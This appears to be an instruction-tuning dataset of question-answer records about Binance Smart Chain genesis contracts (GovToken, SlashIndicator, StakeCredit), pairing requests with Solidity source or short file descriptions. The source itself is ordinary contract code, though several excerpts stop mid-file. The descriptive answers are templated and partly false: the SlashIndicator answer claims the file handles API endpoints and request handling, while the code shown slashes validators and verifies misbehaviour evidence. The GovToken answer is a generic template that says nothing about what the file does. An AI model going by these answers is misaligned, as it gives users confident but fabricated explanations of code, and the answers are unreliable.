{"instruction": "What does the file GovToken.sol do?", "input": "```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\nimport \"@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC20BurnableUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC20PermitUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC20VotesUpgradeable.sol\";\n\nimport \"./SystemV2.sol\";\nimport \"./interface/0.8.x/IStakeCredit.sol\";\n\ncontract GovToken is\n    SystemV2,\n    Initializable,\n    ERC20Upgradeable,\n    ERC20BurnableUpgradeable,\n    ERC20PermitUpgradeable,\n    ERC20VotesUpgradeable\n{\n    /*----------------- constants -----------------*/\n    string private constant NAME = \"BSC Governance Token\";\n    string private constant SYMBOL = \"govBNB\";\n\n    /*----------------- errors -----------------*/\n    // @notice signature: 0x8cd22d19\n    error TransferNotAllowed();\n    // @notice signature: 0x20287471\n    error ApproveNotAllowed();\n    // @notice signature: 0xe5d87767\n    error BurnNotAllowed();\n\n    /*----------------- storage -----------------*/\n    // validator StakeCredit contract => user => amount\n    mapping(address => mapping(address => uint256)) public mintedMap;\n\n    /*----------------- init -----------------*/\n    function initialize() public initializer onlyCoinbase onlyZeroGasPrice {\n        __ERC20_init(NAME, SYMBOL);\n        __ERC20Burnable_init();\n        __ERC20Permit_init(NAME);\n        __ERC20Votes_init();\n    }\n\n    /*----------------- external functions -----------------*/\n    /**\n     * @dev Sync the account's govBNB amount to the actual BNB value of the StakingCredit he holds\n     * @param stakeCredit the stakeCredit Token contract\n     * @param account the account to sync gov tokens to\n     */\n    function sync(address stakeCredit, address account) external onlyStakeHub {\n        _sync(stakeCredit, account);\n    }\n\n    /**\n     * @dev Batch sync the account's govBNB amo\n```", "output": "This file `GovToken.sol` is part of the contracts project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for SlashIndicator.sol which is part of the contracts project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\SlashIndicator.sol`:\n\n```sol\npragma solidity 0.6.4;\npragma experimental ABIEncoderV2;\n\nimport \"./System.sol\";\nimport \"./lib/0.6.x/BytesToTypes.sol\";\nimport \"./lib/0.6.x/TypesToBytes.sol\";\nimport \"./lib/0.6.x/BytesLib.sol\";\nimport \"./lib/0.6.x/Memory.sol\";\nimport \"./interface/0.6.x/ISlashIndicator.sol\";\nimport \"./interface/0.6.x/IApplication.sol\";\nimport \"./interface/0.6.x/IBSCValidatorSet.sol\";\nimport \"./interface/0.6.x/IParamSubscriber.sol\";\nimport \"./interface/0.6.x/ISystemReward.sol\";\nimport \"./interface/0.6.x/IStakeHub.sol\";\nimport \"./lib/0.6.x/RLPEncode.sol\";\n\ncontract SlashIndicator is ISlashIndicator, System, IParamSubscriber, IApplication {\n    using RLPEncode for *;\n\n    uint256 public constant MISDEMEANOR_THRESHOLD = 50;\n    uint256 public constant FELONY_THRESHOLD = 150;\n    uint256 public constant DECREASE_RATE = 4;\n\n    // State of the contract\n    address[] public validators;\n    mapping(address => Indicator) public indicators;\n    uint256 public previousHeight;\n\n    // The BSC validators assign proper values for `misdemeanorThreshold` and `felonyThreshold` through governance.\n    // The proper values depends on BSC network's tolerance for continuous missing blocks.\n    uint256 public misdemeanorThreshold;\n    uint256 public felonyThreshold;\n\n    // BEP-126 Fast Finality\n    // @notice change name from `INIT_FINALITY_SLASH_REWARD_RATIO` to `INIT_FELONY_SLASH_REWARD_RATIO` after BC-fusion\n    uint256 public constant INIT_FELONY_SLASH_REWARD_RATIO = 20;\n\n    // @notice change name from `finalitySlashRewardRatio` to `felonySlashRewardRatio` after BC-fusion\n    uint256 public felonySlashRewardRatio;\n    bool public enableMaliciousVoteSlash;\n\n    uint256 public constant INIT_FELONY_SLASH_SCOPE = 28800; // 1 days(block number)\n\n    uint256 public felonySlashScope;\n\n    event validatorSlashed(address indexed validator);\n    event indicatorCleaned();\n    event paramChange(string key, bytes value);\n    event failedFelony(address indexed validator, uint256 slashCount, bytes failReason);\n\n    event maliciousVoteSlashed(bytes32 indexed voteAddrSlice);  // @dev deprecated\n    event knownResponse(uint32 code);  // @dev deprecated\n    event unKnownResponse(uint32 code);  // @dev deprecated\n    event crashResponse();  // @dev deprecated\n\n    struct Indicator {\n        uint256 height;\n        uint256 count;\n        bool exist;\n    }\n\n    // Proof that a validator misbehaved in fast finality\n    struct VoteData {\n        uint256 srcNum;\n        bytes32 srcHash;\n        uint256 tarNum;\n        bytes32 tarHash;\n        bytes sig;\n    }\n\n    struct FinalityEvidence {\n        VoteData voteA;\n        VoteData voteB;\n        bytes voteAddr;\n    }\n\n    modifier oncePerBlock() {\n        require(block.number > previousHeight, \"can not slash twice in one block\");\n        _;\n        previousHeight = block.number;\n    }\n\n    function init() external onlyNotInit {\n        misdemeanorThreshold = MISDEMEANOR_THRESHOLD;\n        felonyThreshold = FELONY_THRESHOLD;\n        alreadyInit = true;\n    }\n\n    /*----------------- Implement cross chain app -----------------*/\n    function handleSynPackage(\n        uint8,\n        bytes calldata\n    ) external override onlyCrossChainContract onlyInit returns (bytes memory) {\n        revert(\"deprecated\");\n    }\n\n    function handleAckPackage(uint8, bytes calldata msgBytes) external override onlyCrossChainContract onlyInit {\n        revert(\"deprecated\");\n    }\n\n    function handleFailAckPackage(uint8, bytes calldata) external override onlyCrossChainContract onlyInit {\n        revert(\"deprecated\");\n    }\n\n    /*----------------- External func -----------------*/\n    /**\n     * @dev Slash the validator who should have produced the current block\n     *\n     * @param validator The validator who should have produced the current block\n     */\n    function slash(address validator) external onlyCoinbase onlyInit oncePerBlock onlyZeroGasPrice {\n        if (!IBSCValidatorSet(VALIDATOR_CONTRACT_ADDR).isCurrentValidator(validator)) {\n            return;\n        }\n        Indicator memory indicator = indicators[validator];\n        if (indicator.exist) {\n            ++indicator.count;\n        } else {\n            indicator.exist = true;\n            indicator.count = 1;\n            validators.push(validator);\n        }\n        indicator.height = block.number;\n        if (indicator.count % felonyThreshold == 0) {\n            indicator.count = 0;\n            IBSCValidatorSet(VALIDATOR_CONTRACT_ADDR).felony(validator);\n            _downtimeSlash(validator, indicator.count, false);\n        } else if (indicator.count % misdemeanorThreshold == 0) {\n            IBSCValidatorSet(VALIDATOR_CONTRACT_ADDR).misdemeanor(validator);\n        }\n        indicators[validator] = indicator;\n        emit validatorSlashed(validator);\n    }\n\n    // To prevent validator misbehaving and leaving, do not clean slash record to zero, but decrease by felonyThreshold/DECREASE_RATE .\n    // Clean is an effective implement to reorganize \"validators\" and \"indicators\".\n    function clean() external override(ISlashIndicator) onlyValidatorContract onlyInit {\n        if (validators.length == 0) {\n            return;\n        }\n        uint256 i;\n        uint256 j = validators.length - 1;\n        for (; i <= j;) {\n            bool findLeft = false;\n            bool findRight = false;\n            for (; i < j; ++i) {\n                Indicator memory leftIndicator = indicators[validators[i]];\n                if (leftIndicator.count > felonyThreshold / DECREASE_RATE) {\n                    leftIndicator.count = leftIndicator.count - felonyThreshold / DECREASE_RATE;\n                    indicators[validators[i]] = leftIndicator;\n                } else {\n                    findLeft = true;\n                    break;\n                }\n            }\n            for (; i <= j; --j) {\n                Indicator memory rightIndicator = indicators[validators[j]];\n                if (rightIndicator.count > felonyThreshold / DECREASE_RATE) {\n                    rightIndicator.count = rightIndicator.count - felonyThreshold / DECREASE_RATE;\n                    indicators[validators[j]] = rightIndicator;\n                    findRight = true;\n                    break;\n                } else {\n                    delete indicators[validators[j]];\n                    validators.pop();\n                }\n                // avoid underflow\n                if (j == 0) {\n                    break;\n                }\n            }\n            // swap element in array\n            if (findLeft && findRight) {\n                delete indicators[validators[i]];\n                validators[i] = validators[j];\n                validators.pop();\n            }\n            // avoid underflow\n            if (j == 0) {\n                break;\n            }\n            // move to next\n            ++i;\n            --j;\n        }\n        emit indicatorCleaned();\n    }\n\n    function downtimeSlash(\n        address validator,\n        uint256 count,\n        bool shouldRevert\n    ) external override onlyValidatorContract {\n        _downtimeSlash(validator, count, shouldRevert);\n    }\n\n    function _downtimeSlash(address validator, uint256 count, bool shouldRevert) internal {\n        if (shouldRevert) {\n            IStakeHub(STAKE_HUB_ADDR).downtimeSlash(validator);\n        } else {\n            try IStakeHub(STAKE_HUB_ADDR).downtimeSlash(validator) { }\n            catch Error(string memory reason) {\n                emit failedFelony(validator, count, bytes(reason));\n            } catch (bytes memory lowLevelData) {\n                emit failedFelony(validator, count, lowLevelData);\n            }\n        }\n    }\n\n    function submitFinalityViolationEvidence(FinalityEvidence memory _evidence) public onlyInit {\n        require(enableMaliciousVoteSlash, \"malicious vote slash not enabled\");\n        if (felonySlashRewardRatio == 0) {\n            felonySlashRewardRatio = INIT_FELONY_SLASH_REWARD_RATIO;\n        }\n        if (felonySlashScope == 0) {\n            felonySlashScope = INIT_FELONY_SLASH_SCOPE;\n        }\n\n        // Basic check\n        require(\n            _evidence.voteA.tarNum + felonySlashScope > block.number\n                && _evidence.voteB.tarNum + felonySlashScope > block.number,\n            \"target block too old\"\n        );\n        require(\n            !(_evidence.voteA.srcHash == _evidence.voteB.srcHash && _evidence.voteA.tarHash == _evidence.voteB.tarHash),\n            \"two identical votes\"\n        );\n        require(\n            _evidence.voteA.srcNum < _evidence.voteA.tarNum && _evidence.voteB.srcNum < _evidence.voteB.tarNum,\n            \"srcNum bigger than tarNum\"\n        );\n\n        // Vote rules check\n        require(\n            (_evidence.voteA.srcNum < _evidence.voteB.srcNum && _evidence.voteB.tarNum < _evidence.voteA.tarNum)\n                || (_evidence.voteB.srcNum < _evidence.voteA.srcNum && _evidence.voteA.tarNum < _evidence.voteB.tarNum)\n                || _evidence.voteA.tarNum == _evidence.voteB.tarNum,\n            \"no violation of vote rules\"\n        );\n\n        // check voteAddr to protect validators from being slashed for old voteAddr\n        require(\n            IBSCValidatorSet(VALIDATOR_CONTRACT_ADDR).isMonitoredForMaliciousVote(_evidence.voteAddr),\n            \"voteAddr is not found\"\n        );\n\n        // BLS verification\n        require(\n            _verifyBLSSignature(_evidence.voteA, _evidence.voteAddr)\n                && _verifyBLSSignature(_evidence.voteB, _evidence.voteAddr),\n            \"verify signature failed\"\n        );\n\n        // reward sender and felony validator if validator found\n        (address[] memory vals, bytes[] memory voteAddrs) =\n            IBSCValidatorSet(VALIDATOR_CONTRACT_ADDR).getLivingValidators();\n        for (uint256 i; i < voteAddrs.length; ++i) {\n            if (BytesLib.equal(voteAddrs[i], _evidence.voteAddr)) {\n                uint256 amount = (address(SYSTEM_REWARD_ADDR).balance * felonySlashRewardRatio) / 100;\n                ISystemReward(SYSTEM_REWARD_ADDR).claimRewards(msg.sender, amount);\n                IBSCValidatorSet(VALIDATOR_CONTRACT_ADDR).felony(vals[i]);\n                break;\n            }\n        }\n\n        IStakeHub(STAKE_HUB_ADDR).maliciousVoteSlash(_evidence.voteAddr);\n    }\n\n    function submitDoubleSignEvidence(bytes memory header1, bytes memory header2) public onlyInit {\n        if (felonySlashRewardRatio == 0) {\n            felonySlashRewardRatio = INIT_FELONY_SLASH_REWARD_RATIO;\n        }\n        if (felonySlashScope == 0) {\n            felonySlashScope = INIT_FELONY_SLASH_SCOPE;\n        }\n\n        require(header1.length != 0 && header2.length != 0, \"empty header\");\n\n        bytes[] memory elements = new bytes[](3);\n        elements[0] = bscChainID.encodeUint();\n        elements[1] = header1.encodeBytes();\n        elements[2] = header2.encodeBytes();\n\n        // call precompile contract to verify evidence\n        bytes memory input = elements.encodeList();\n        bytes memory output = new bytes(52);\n        assembly {\n            let len := mload(input)\n            if iszero(staticcall(not(0), 0x68, add(input, 0x20), len, add(output, 0x20), 0x34)) { revert(0, 0) }\n        }\n\n        address signer;\n        uint256 evidenceHeight;\n        assembly {\n            signer := mload(add(output, 0x14))\n            evidenceHeight := mload(add(output, 0x34))\n        }\n        require(IStakeHub(STAKE_HUB_ADDR).consensusToOperator(signer) != address(0), \"validator not migrated\");\n        require(evidenceHeight + felonySlashScope >= block.number, \"evidence too old\");\n\n        // reward sender and felony validator\n        IStakeHub(STAKE_HUB_ADDR).doubleSignSlash(signer);\n        IBSCValidatorSet(VALIDATOR_CONTRACT_ADDR).felony(signer);\n\n        uint256 amount = (address(SYSTEM_REWARD_ADDR).balance * felonySlashRewardRatio) / 100;\n        ISystemReward(SYSTEM_REWARD_ADDR).claimRewards(msg.sender, amount);\n    }\n\n    /**\n     * @dev Send a felony cross-chain package to jail a validator\n     *\n     * @param validator Who will be jailed\n     */\n    function sendFelonyPackage(address validator) external override(ISlashIndicator) onlyValidatorContract onlyInit {\n        emit failedFelony(validator, 0, \"deprecated\");\n    }\n\n    function _verifyBLSSignature(VoteData memory vote, bytes memory voteAddr) internal view returns (bool) {\n        bytes[] memory elements = new bytes[](4);\n        bytes memory _bytes = new bytes(32);\n        elements[0] = vote.srcNum.encodeUint();\n        TypesToBytes.bytes32ToBytes(32, vote.srcHash, _bytes);\n        elements[1] = _bytes.encodeBytes();\n        elements[2] = vote.tarNum.encodeUint();\n        TypesToBytes.bytes32ToBytes(32, vote.tarHash, _bytes);\n        elements[3] = _bytes.encodeBytes();\n\n        TypesToBytes.bytes32ToBytes(32, keccak256(elements.encodeList()), _bytes);\n\n        // assemble input data\n        bytes memory input = new bytes(176);\n        _bytesConcat(input, _bytes, 0, 32);\n        _bytesConcat(input, vote.sig, 32, 96);\n        _bytesConcat(input, voteAddr, 128, 48);\n\n        // call the precompiled contract to verify the BLS signature\n        // the precompiled contract's address is 0x66\n        bytes memory output = new bytes(1);\n        assembly {\n            let len := mload(input)\n            if iszero(staticcall(not(0), 0x66, add(input, 0x20), len, add(output, 0x20), 0x01)) { revert(0, 0) }\n        }\n        if (BytesLib.toUint8(output, 0) != uint8(1)) {\n            return false;\n        }\n        return true;\n    }\n\n    function _bytesConcat(bytes memory data, bytes memory _bytes, uint256 index, uint256 len) internal pure {\n        for (uint256 i; i < len; ++i) {\n            data[index++] = _bytes[i];\n        }\n    }\n\n    /*----------------- Param update -----------------*/\n    function updateParam(string calldata key, bytes calldata value) external override onlyInit onlyGov {\n        if (Memory.compareStrings(key, \"misdemeanorThreshold\")) {\n            require(value.length == 32, \"length of misdemeanorThreshold mismatch\");\n            uint256 newMisdemeanorThreshold = BytesToTypes.bytesToUint256(32, value);\n            require(\n                newMisdemeanorThreshold >= 1 && newMisdemeanorThreshold < felonyThreshold,\n                \"the misdemeanorThreshold out of range\"\n            );\n            misdemeanorThreshold = newMisdemeanorThreshold;\n        } else if (Memory.compareStrings(key, \"felonyThreshold\")) {\n            require(value.length == 32, \"length of felonyThreshold mismatch\");\n            uint256 newFelonyThreshold = BytesToTypes.bytesToUint256(32, value);\n            require(\n                newFelonyThreshold <= 1000 && newFelonyThreshold > misdemeanorThreshold,\n                \"the felonyThreshold out of range\"\n            );\n            felonyThreshold = newFelonyThreshold;\n        } else if (Memory.compareStrings(key, \"felonySlashRewardRatio\")) {\n            require(value.length == 32, \"length of felonySlashRewardRatio mismatch\");\n            uint256 newFelonySlashRewardRatio = BytesToTypes.bytesToUint256(32, value);\n            require(\n                newFelonySlashRewardRatio >= 10 && newFelonySlashRewardRatio < 100,\n                \"the felony slash reward ratio out of range\"\n            );\n            felonySlashRewardRatio = newFelonySlashRewardRatio;\n        } else if (Memory.compareStrings(key, \"enableMaliciousVoteSlash\")) {\n            require(value.length == 32, \"length of enableMaliciousVoteSlash mismatch\");\n            enableMaliciousVoteSlash = BytesToTypes.bytesToBool(32, value);\n        } else if (Memory.compareStrings(key, \"felonySlashScope\")) {\n            require(value.length == 32, \"length of felonySlashScope mismatch\");\n            uint256 newMaliciousVoteSlashScope = BytesToTypes.bytesToUint256(32, value);\n            require(\n                newMaliciousVoteSlashScope >= 28800 * 1 && newMaliciousVoteSlashScope < 28800 * 30,\n                \"the malicious vote slash scope out of range\"\n            );\n            felonySlashScope = newMaliciousVoteSlashScope;\n        } else {\n            require(false, \"unknown param\");\n        }\n        emit paramChange(key, value);\n    }\n\n    /*----------------- query api -----------------*/\n    function getSlashIndicator(address validator) external view returns (uint256, uint256) {\n        Indicator memory indicator = indicators[validator];\n        return (indicator.height, indicator.count);\n    }\n\n    function encodeSlashPackage(address valAddr) internal view returns (bytes memory) {\n        bytes[] memory elements = new bytes[](4);\n        elements[0] = valAddr.encodeAddress();\n        elements[1] = uint256(block.number).encodeUint();\n        elements[2] = uint256(bscChainID).encodeUint();\n        elements[3] = uint256(block.timestamp).encodeUint();\n        return elements.encodeList();\n    }\n\n    function encodeVoteSlashPackage(bytes memory voteAddr) internal view returns (bytes memory) {\n        bytes[] memory elements = new bytes[](4);\n        elements[0] = voteAddr.encodeBytes();\n        elements[1] = uint256(block.number).encodeUint();\n        elements[2] = uint256(bscChainID).encodeUint();\n        elements[3] = uint256(block.timestamp).encodeUint();\n        return elements.encodeList();\n    }\n\n    function getSlashThresholds() external view override(ISlashIndicator) returns (uint256, uint256) {\n        return (misdemeanorThreshold, felonyThreshold);\n    }\n}\n\n```"}
{"instruction": "What does the file SlashIndicator.sol do?", "input": "```sol\npragma solidity 0.6.4;\npragma experimental ABIEncoderV2;\n\nimport \"./System.sol\";\nimport \"./lib/0.6.x/BytesToTypes.sol\";\nimport \"./lib/0.6.x/TypesToBytes.sol\";\nimport \"./lib/0.6.x/BytesLib.sol\";\nimport \"./lib/0.6.x/Memory.sol\";\nimport \"./interface/0.6.x/ISlashIndicator.sol\";\nimport \"./interface/0.6.x/IApplication.sol\";\nimport \"./interface/0.6.x/IBSCValidatorSet.sol\";\nimport \"./interface/0.6.x/IParamSubscriber.sol\";\nimport \"./interface/0.6.x/ISystemReward.sol\";\nimport \"./interface/0.6.x/IStakeHub.sol\";\nimport \"./lib/0.6.x/RLPEncode.sol\";\n\ncontract SlashIndicator is ISlashIndicator, System, IParamSubscriber, IApplication {\n    using RLPEncode for *;\n\n    uint256 public constant MISDEMEANOR_THRESHOLD = 50;\n    uint256 public constant FELONY_THRESHOLD = 150;\n    uint256 public constant DECREASE_RATE = 4;\n\n    // State of the contract\n    address[] public validators;\n    mapping(address => Indicator) public indicators;\n    uint256 public previousHeight;\n\n    // The BSC validators assign proper values for `misdemeanorThreshold` and `felonyThreshold` through governance.\n    // The proper values depends on BSC network's tolerance for continuous missing blocks.\n    uint256 public misdemeanorThreshold;\n    uint256 public felonyThreshold;\n\n    // BEP-126 Fast Finality\n    // @notice change name from `INIT_FINALITY_SLASH_REWARD_RATIO` to `INIT_FELONY_SLASH_REWARD_RATIO` after BC-fusion\n    uint256 public constant INIT_FELONY_SLASH_REWARD_RATIO = 20;\n\n    // @notice change name from `finalitySlashRewardRatio` to `felonySlashRewardRatio` after BC-fusion\n    uint256 public felonySlashRewardRatio;\n    bool public enableMaliciousVoteSlash;\n\n    uint256 public constant INIT_FELONY_SLASH_SCOPE = 28800; // 1 days(block number)\n\n    uint256 public felonySlashScope;\n\n    event validatorSlashed(address indexed validator);\n    event indicatorCleaned();\n    event paramChange(string key, bytes value);\n    event failedFelony(address indexed validator, uint256 slashCount, bytes failReason);\n\n  \n```", "output": "This file `SlashIndicator.sol` is part of the contracts project. Based on the code structure, it appears to handle API endpoints and request handling."}
{"instruction": "Show me the code for StakeCredit.sol which is part of the contracts project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\StakeCredit.sol`:\n\n```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\nimport \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/utils/CountersUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/utils/structs/DoubleEndedQueueUpgradeable.sol\";\n\nimport \"./SystemV2.sol\";\nimport \"./interface/0.8.x/IStakeHub.sol\";\n\ncontract StakeCredit is SystemV2, Initializable, ReentrancyGuardUpgradeable, ERC20Upgradeable {\n    using CountersUpgradeable for CountersUpgradeable.Counter;\n    using DoubleEndedQueueUpgradeable for DoubleEndedQueueUpgradeable.Bytes32Deque;\n\n    /*----------------- constants -----------------*/\n    uint256 private constant COMMISSION_RATE_BASE = 10_000; // 100%\n\n    /*----------------- errors -----------------*/\n    // @notice signature: 0x2fe8dae9\n    error ZeroTotalShares();\n    // @notice signature: 0xf6ed9ce0\n    error ZeroTotalPooledBNB();\n    // @notice signature: 0x8cd22d19\n    error TransferNotAllowed();\n    // @notice signature: 0x20287471\n    error ApproveNotAllowed();\n    // @notice signature: 0x858f9ae4\n    error WrongInitContext();\n    // @notice signature: 0x90b8ec18\n    error TransferFailed();\n    // @notice signature: 0x1f2a2005\n    error ZeroAmount();\n    // @notice signature: 0x9811e0c7\n    error ZeroShares();\n    // @notice signature: 0xf4d678b8\n    error InsufficientBalance();\n    // @notice signature: 0xad418937\n    error NoUnbondRequest();\n    // @notice signature: 0x0f363824\n    error NoClaimableUnbondRequest();\n    // @notice signature: 0xb19e9115\n    error RequestExisted();\n\n    /*----------------- storage -----------------*/\n    address public validator; // validator's operator address\n    uint256 public totalPooledBNB; // total reward plus total BNB staked in the pool\n\n    // hash of the unbond request => unbond request\n    mapping(bytes32 => UnbondRequest) private _unbondRequests;\n    // delegator address => unbond request queue(hash of the request)\n    mapping(address => DoubleEndedQueueUpgradeable.Bytes32Deque) private _unbondRequestsQueue;\n    // delegator address => personal unbond sequence\n    mapping(address => CountersUpgradeable.Counter) private _unbondSequence;\n\n    // day index => receivedReward\n    mapping(uint256 => uint256) public rewardRecord;\n    // day index => totalPooledBNB\n    mapping(uint256 => uint256) public totalPooledBNBRecord;\n\n    /*----------------- structs and events -----------------*/\n    struct UnbondRequest {\n        uint256 shares;\n        uint256 bnbAmount;\n        uint256 unlockTime;\n    }\n\n    event RewardReceived(uint256 rewardToAll, uint256 commission);\n\n    /**\n     * @notice only accept BNB from `StakeHub`\n     */\n    receive() external payable onlyStakeHub {\n        uint256 index = block.timestamp / IStakeHub(STAKE_HUB_ADDR).BREATHE_BLOCK_INTERVAL();\n        totalPooledBNBRecord[index] = totalPooledBNB;\n        rewardRecord[index] += msg.value;\n        totalPooledBNB += msg.value;\n    }\n\n    /*----------------- init -----------------*/\n    /*\n     * @param _validator validator's operator address\n     * @param _moniker validator's moniker\n     */\n    function initialize(address _validator, string calldata _moniker) external payable initializer onlyStakeHub {\n        string memory name_ = string.concat(\"Stake \", _moniker, \" Credit\");\n        string memory symbol_ = string.concat(\"st\", _moniker);\n        __ERC20_init_unchained(name_, symbol_);\n        __ReentrancyGuard_init_unchained();\n\n        validator = _validator;\n\n        _bootstrapInitialHolder(msg.value);\n    }\n\n    /*----------------- external functions -----------------*/\n    /**\n     * @param delegator the address of the delegator\n     * @return shares the amount of shares minted\n     */\n    function delegate(\n        address delegator\n    ) external payable onlyStakeHub returns (uint256 shares) {\n        if (msg.value == 0) revert ZeroAmount();\n        shares = _mintAndSync(delegator, msg.value);\n        if (shares == 0) revert ZeroShares();\n    }\n\n    /**\n     * @param delegator the address of the delegator\n     * @param shares the amount of shares to be undelegated\n     * @return bnbAmount the amount of BNB to be unlocked\n     */\n    function undelegate(address delegator, uint256 shares) external onlyStakeHub returns (uint256 bnbAmount) {\n        if (shares == 0) revert ZeroShares();\n        if (shares > balanceOf(delegator)) revert InsufficientBalance();\n\n        // add to the queue\n        bnbAmount = _burnAndSync(delegator, shares);\n        uint256 unlockTime = block.timestamp + IStakeHub(STAKE_HUB_ADDR).unbondPeriod();\n        UnbondRequest memory request = UnbondRequest({ shares: shares, bnbAmount: bnbAmount, unlockTime: unlockTime });\n        bytes32 hash = keccak256(abi.encodePacked(delegator, _useSequence(delegator)));\n        // the hash should not exist in the queue\n        // this will not happen in normal cases\n        if (_unbondRequests[hash].shares != 0) revert RequestExisted();\n        _unbondRequests[hash] = request;\n        _unbondRequestsQueue[delegator].pushBack(hash);\n    }\n\n    /**\n     * @dev Unbond immediately without adding to the queue. Only for redelegate process.\n     * @param delegator the address of the delegator\n     * @param shares the amount of shares to be undelegated\n     * @return bnbAmount the amount of BNB unlocked\n     */\n    function unbond(address delegator, uint256 shares) external onlyStakeHub returns (uint256 bnbAmount) {\n        if (shares == 0) revert ZeroShares();\n        if (shares > balanceOf(delegator)) revert InsufficientBalance();\n\n        bnbAmount = _burnAndSync(delegator, shares);\n\n        (bool success,) = STAKE_HUB_ADDR.call{ value: bnbAmount }(\"\");\n        if (!success) revert TransferFailed();\n    }\n\n    /**\n     * @param delegator the address of the delegator\n     * @param number the number of unbond requests to be claimed. 0 means claim all\n     * @return _totalBnbAmount the total amount of BNB claimed\n     */\n    function claim(address payable delegator, uint256 number) external onlyStakeHub nonReentrant returns (uint256) {\n        // number == 0 means claim all\n        // number should not exceed the length of the queue\n        if (_unbondRequestsQueue[delegator].length() == 0) revert NoUnbondRequest();\n        number = (number == 0 || number > _unbondRequestsQueue[delegator].length())\n            ? _unbondRequestsQueue[delegator].length()\n            : number;\n\n        uint256 _totalBnbAmount;\n        while (number != 0) {\n            bytes32 hash = _unbondRequestsQueue[delegator].front();\n            UnbondRequest memory request = _unbondRequests[hash];\n            if (block.timestamp < request.unlockTime) {\n                break;\n            }\n\n            // remove from the queue\n            _unbondRequestsQueue[delegator].popFront();\n\n            _totalBnbAmount += request.bnbAmount;\n            --number;\n        }\n        if (_totalBnbAmount == 0) revert NoClaimableUnbondRequest();\n\n        uint256 _gasLimit = IStakeHub(STAKE_HUB_ADDR).transferGasLimit();\n        (bool success,) = delegator.call{ gas: _gasLimit, value: _totalBnbAmount }(\"\");\n        if (!success) revert TransferFailed();\n\n        return _totalBnbAmount;\n    }\n\n    /**\n     * @dev Distribute the reward to the validator and all delegators. Only the `StakeHub` contract can call this function.\n     * @param commissionRate the commission rate of the validator\n     */\n    function distributeReward(\n        uint64 commissionRate\n    ) external payable onlyStakeHub {\n        uint256 bnbAmount = msg.value;\n        uint256 _commission = (bnbAmount * uint256(commissionRate)) / COMMISSION_RATE_BASE;\n        uint256 _reward = bnbAmount - _commission;\n\n        uint256 index = block.timestamp / IStakeHub(STAKE_HUB_ADDR).BREATHE_BLOCK_INTERVAL();\n        totalPooledBNBRecord[index] = totalPooledBNB;\n        rewardRecord[index] += _reward;\n        totalPooledBNB += _reward;\n\n        // mint commission to the validator\n        _mintAndSync(validator, _commission);\n\n        emit RewardReceived(_reward, _commission);\n    }\n\n    /**\n     * @dev Slash the validator. Only the `StakeHub` contract can call this function.\n     * @param slashBnbAmount the amount of BNB to be slashed\n     * @return realSlashBnbAmount the real amount of BNB slashed\n     */\n    function slash(\n        uint256 slashBnbAmount\n    ) external onlyStakeHub returns (uint256) {\n        uint256 selfDelegation = balanceOf(validator);\n        uint256 slashShares = getSharesByPooledBNB(slashBnbAmount);\n\n        slashShares = slashShares > selfDelegation ? selfDelegation : slashShares;\n        uint256 realSlashBnbAmount = _burnAndSync(validator, slashShares);\n\n        (bool success,) = SYSTEM_REWARD_ADDR.call{ value: realSlashBnbAmount }(\"\");\n        if (!success) revert TransferFailed();\n\n        return realSlashBnbAmount;\n    }\n\n    /*----------------- view functions -----------------*/\n    /**\n     * @return the amount of shares that corresponds to `_bnbAmount` protocol-controlled BNB.\n     */\n    function getSharesByPooledBNB(\n        uint256 bnbAmount\n    ) public view returns (uint256) {\n        if (totalPooledBNB == 0) revert ZeroTotalPooledBNB();\n        return (bnbAmount * totalSupply()) / totalPooledBNB;\n    }\n\n    /**\n     * @return the amount of BNB that corresponds to `_sharesAmount` token shares.\n     */\n    function getPooledBNBByShares(\n        uint256 shares\n    ) public view returns (uint256) {\n        if (totalSupply() == 0) revert ZeroTotalShares();\n        return (shares * totalPooledBNB) / totalSupply();\n    }\n\n    /**\n     * @return the unbond request at _index.\n     */\n    function unbondRequest(address delegator, uint256 _index) public view returns (UnbondRequest memory) {\n        bytes32 hash = _unbondRequestsQueue[delegator].at(_index);\n        return _unbondRequests[hash];\n    }\n\n    /**\n     * @return the total length of delegator's pending unbond queue.\n     */\n    function pendingUnbondRequest(\n        address delegator\n    ) public view returns (uint256) {\n        return _unbondRequestsQueue[delegator].length();\n    }\n\n    /**\n     * @return the total number of delegator's claimable unbond requests.\n     */\n    function claimableUnbondRequest(\n        address delegator\n    ) public view returns (uint256) {\n        uint256 length = _unbondRequestsQueue[delegator].length();\n        uint256 count;\n        for (uint256 i; i < length; ++i) {\n            bytes32 hash = _unbondRequestsQueue[delegator].at(i);\n            UnbondRequest memory request = _unbondRequests[hash];\n            if (block.timestamp >= request.unlockTime) {\n                ++count;\n            } else {\n                break;\n            }\n        }\n        return count;\n    }\n\n    /**\n     * @return the sum of first `number` requests' BNB locked in delegator's unbond queue.\n     */\n    function lockedBNBs(address delegator, uint256 number) public view returns (uint256) {\n        // number == 0 means all\n        // number should not exceed the length of the queue\n        if (_unbondRequestsQueue[delegator].length() == 0) {\n            return 0;\n        }\n        number = (number == 0 || number > _unbondRequestsQueue[delegator].length())\n            ? _unbondRequestsQueue[delegator].length()\n            : number;\n\n        uint256 _totalBnbAmount;\n        for (uint256 i; i < number; ++i) {\n            bytes32 hash = _unbondRequestsQueue[delegator].at(i);\n            UnbondRequest memory request = _unbondRequests[hash];\n            _totalBnbAmount += request.bnbAmount;\n        }\n        return _totalBnbAmount;\n    }\n\n    /**\n     * @return the personal unbond sequence of the delegator.\n     */\n    function unbondSequence(\n        address delegator\n    ) public view returns (uint256) {\n        return _unbondSequence[delegator].current();\n    }\n\n    /**\n     * @return the total amount of BNB staked and reward of the delegator.\n     */\n    function getPooledBNB(\n        address account\n    